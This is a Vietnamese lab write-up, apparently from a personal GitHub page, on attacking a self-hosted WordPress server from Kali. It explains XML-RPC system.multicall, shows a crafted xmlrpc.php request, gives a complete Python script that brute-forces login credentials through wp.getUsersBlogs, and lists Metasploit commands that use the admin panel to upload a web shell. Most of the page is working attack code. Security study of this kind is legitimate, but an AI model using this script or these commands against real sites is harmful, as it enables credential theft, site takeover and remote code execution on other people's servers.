# WordPress

## Setup

- Ubuntu (server) chạy WordPress [build](https://ubuntu.com/tutorials/install-and-configure-wordpress#1-overview)
- Kali (attacker)

### Vulnerablity

### xmlrpc

Khái niệm: XML-RPC là một cách đơn giản, di động để thực hiện các cuộc gọi thủ tục từ xa qua HTTP. Nó có thể được sử dụng với Perl, Java, Python, C, C ++, PHP và nhiều ngôn ngữ lập trình khác. Các hệ thống quản lý nội dung WordPress, Drupal và hầu hết các hệ thống hỗ trợ XML-RPC.

Kiểm tra WordPress có bật XMLRPC hay không: https://website/xmlrpc.php

Một trong những tính năng ẩn của XML-RPC là bạn có thể sử dụng phương thức System.Multicall để thực hiện nhiều phương thức trong một yêu cầu duy nhất. Điều đó rất hữu ích vì nó cho phép ứng dụng vượt qua nhiều lệnh trong một yêu cầu HTTP.

```
<methodCall><methodName>system.multicall</methodName>
 <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
 <member><name>params</name><value><array><data>
 <value><string></string></value><value><string>admin</string></value><value><string>demo123</string></value>
```
Phương thức wp.getCategories yêu cầu user/pass, lợi dụng sự xác thực của nó để brute force tài khoản.

Nhiều phương thức cần yêu cầu xác thực:

```
wp.getUsersBlogs, wp.newPost, wp.editPost, wp.deletePost, wp.getPost, wp.getPosts, 
wp.newTerm, wp.editTerm, wp.deleteTerm, wp.getTerm, wp.getTerms, wp.getTaxonomy, 
wp.getTaxonomies, wp.getUser, wp.getUsers, wp.getProfile, wp.editProfile, wp.getPage, 
wp.getPages, wp.newPage, wp.deletePage, wp.editPage, wp.getPageList, wp.getAuthors, 
wp.getTags, wp.newCategory, wp.deleteCategory, wp.suggestCategories, wp.getComment, 
wp.getComments, wp.deleteComment, wp.editComment, wp.newComment, wp.getCommentStatusList, 
wp.getCommentCount, wp.getPostStatusList, wp.getPageStatusList, wp.getPageTemplates, 
wp.getOptions, wp.setOptions, wp.getMediaItem, wp.getMediaLibrary, wp.getPostFormats, 
wp.getPostType, wp.getPostTypes, wp.getRevisions, wp.restoreRevision, blogger.getUsersBlogs,
blogger.getUserInfo, blogger.getPost, blogger.getRecentPosts, blogger.newPost, 
blogger.editPost, blogger.deletePost, mw.newPost, mw.editPost, mw.getPost, 
mw.getRecentPosts, mw.getCategories, mw.newMediaObject, mt.getRecentPostTitles, 
mt.getPostCategories, mt.setPostCategories
```

Request:

```
POST /xmlrpc.php HTTP/2
Host: 192.168.211.134
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/xml
Content-Length: 1298

<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>
                        <value>
                            <struct>
                                <member>
                                    <name>methodName</name>
                                    <value><string>wp.getUsersBlogs</string></value>
                                </member>
                                <member>
                                    <name>params</name>
                                    <value>
                                        <array>
                                            <data>
                                                <value><string>dt97</string></value>
                                                <value><string>xx@</string></value>
                                            </data>
                                        </array>
                                    </value>
                                </member>
                            </struct>
                        </value>
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>
```

Script python brute force user/pass:

```
import requests

burp0_url = "http://192.168.211.134:80/xmlrpc.php"
burp0_headers = {
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Content-Type": "application/xml"
}

# Danh sách username/password để brute-force
usernames = ["admin", "dt97", "test", "root"]
passwords = ["123456", "password", "xx@", "admin", "root"]

for username in usernames:
    for password in passwords:
        burp0_data = f"""<?xml version="1.0"?>
        <methodCall>
            <methodName>system.multicall</methodName>
            <params>
                <param>
                    <value>
                        <array>
                            <data>
                                <value>
                                    <struct>
                                        <member>
                                            <name>methodName</name>
                                            <value><string>wp.getUsersBlogs</string></value>
                                        </member>
                                        <member>
                                            <name>params</name>
                                            <value>
                                                <array>
                                                    <data>
                                                        <value><string>{username}</string></value>
                                                        <value><string>{password}</string></value>
                                                    </data>
                                                </array>
                                            </value>
                                        </member>
                                    </struct>
                                </value>
                            </data>
                        </array>
                    </value>
                </param>
            </params>
        </methodCall>"""

        response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

        if not "Incorrect username or password." in response.text:  # Nếu phản hồi chứa "admin" thì in ra
            print(f"[+] Tìm thấy: Username: {username} | Password: {password}")
            print("Response:", response.text)
            exit(0)  # Thoát ngay sau khi tìm thấy admin

        print(f"[-] Thử: {username} | {password} -> {response.status_code}")

print("[-] Không tìm thấy admin.")
```

Tận dụng pannel admin để upload webshell: Sử dụng metasploit

```
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > set USERNAME admin
msf exploit(wp_admin_shell_upload) > set PASSWORD admin
msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
msf exploit(wp_admin_shell_upload) > exploit
```

![3](https://github.com/user-attachments/assets/90d06e55-d511-42a8-857d-310836945436)





